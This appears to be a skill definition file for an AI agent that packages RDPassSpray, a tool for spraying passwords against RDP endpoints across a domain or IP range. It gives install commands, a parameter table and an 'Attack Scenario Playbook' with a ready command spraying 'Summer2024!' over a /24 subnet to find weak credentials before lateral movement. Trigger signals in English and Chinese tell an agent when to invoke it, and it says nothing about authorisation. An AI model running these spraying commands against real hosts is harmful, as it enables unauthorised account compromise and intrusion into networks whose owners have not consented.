---
name: rdpassspray-rdp-spray
description: "RDPassSpray: Sprays passwords over domain RDP. Signals: brute force, password spraying, RDP spraying, password dictionary, specified domain."
zh-signals: "RDPassSpray: 域内 RDP 口令喷洒。信号:暴力破解,口令喷射,RDP 喷洒,密码字典,指定域。"
when-to-use: "Use RDPassSpray when performing password spraying against RDP endpoints across a domain or IP range, e.g., to find weak credentials on hosts before lateral movement."
---

# RDPassSpray

- Attack Category: C28 Cloud and Identity Spraying
- Upstream Repository: https://github.com/xFreed0m/RDPassSpray
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/xFreed0m/RDPassSpray && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python RDPassSpray.py -u users.txt -p 'Pass1' -t 10.0.0.5` | RDP spraying |
| `-u user -p passwords.txt` | Password dictionary |
| `-d corp.local` | Target domain |
| `-v` | Verbose |

## Attack Scenario Playbook

### In-domain RDP password spraying

```bash
python RDPassSpray.py -u users.txt -p 'Summer2024!' -t 10.0.0.0/24
# Find hosts with weak credentials before lateral movement
```

## Notes

Protocol-level password spraying against RDP; targets can be IP ranges, and it works for both domains and workgroups.
